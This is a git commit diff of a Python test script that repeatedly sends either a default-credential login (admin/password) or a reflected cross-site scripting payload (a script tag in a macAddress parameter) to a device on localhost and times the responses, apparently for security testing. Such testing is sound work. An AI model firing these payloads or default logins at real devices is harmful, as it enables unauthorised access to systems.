e778513e5fa5a3d479778791205b0763058f1e7d
Jami Laamanen <jamilaamanen@gmail.com>
2020-05-13 18:32:48 +0300

    Removed logging to file and the https-flag, finalized version

--- test_script.py
+++ test_script.py
@@ -5,53 +5,40 @@ import ssl
 import requests
 import warnings
 import datetime
-warnings.filterwarnings("ignore", message="Unverified HTTPS request is being made to host 'localhost'")
-
-# Log how long a request and when
-def log(file_name, time):
-  f = open(file_name, "a")
-  f.write(str(datetime.datetime.now().strftime("%H:%M:%S")) + ', ' + "\n")
-  f.close()
 
 # Login to the device
-def login(url, log):
+def login(url):
   url = url + '/login.php'
   headers = {'username' : 'admin',
     'password' : 'password',
-    'id' : '123456' }
+    'id' : '123456'}
 
-  log.write(str(datetime.datetime.now().strftime("%H:%M:%S")) + ', ')
+  timestamp = str(datetime.datetime.now().strftime("%H:%M:%S"))
   r = requests.post(url, headers=headers, verify=False)
-  print('Response from the server: ' + str(r.status_code))
-  print('Response time: ' + str(r.elapsed))
-  log.write(str(r.elapsed) + "\n")
+  print(timestamp + "," + str(r.elapsed) + "," + str(r.status_code))
 
 # Send the attack
-def attack(url, log):
+def attack(url):
   payload = '?/boardData103?macAddress="><script>alert(1)</script>'
 
-  log.write(str(datetime.datetime.now().strftime("%H:%M:%S")) + ', ')
+  timestamp = str(datetime.datetime.now().strftime("%H:%M:%S"))
   r = requests.get(url + payload, verify=False)
-  print('Response from the server: ' + str(r.status_code))
-  print('Response time: ' + str(r.elapsed))
-  log.write(str(r.elapsed) + "\n")
+  print(timestamp + "," + str(r.elapsed) + "," + str(r.status_code))
 
-# Parse url, read args, log and send the packets
+# Settings, parrse url, read args, log and send the packets
 def main():
-  if args.https:
+  warnings.filterwarnings("ignore", message="Unverified HTTPS request is being made to host 'localhost'")
+
+  if args.port == 20443:
     url = 'https://localhost:' + str(args.port)
   else:
     url = 'http://localhost:' + str(args.port)
 
-  log = open(args.mode + ".txt", "a")
-
   for x in range(args.repeats):
     if args.mode == 'xss':
-      attack(url, log)
+      attack(url)
     else:
-      login(url, log)
-
-  log.close()
+      login(url)
 
 # Define the command line parser     
 if __name__ == "__main__":
@@ -63,11 +50,7 @@ if __name__ == "__main__":
     help='Choses the script mode.')
   parser.add_argument('port',
     type=int, 
-    help='Chooses the port: <port>')
-  parser.add_argument(
-    '--https',
-    action='store_true',
-    help='Sets HTTPS when logging in.')
+    help='Chooses the port.')
   parser.add_argument('-r',
     type=int,
     default=1,
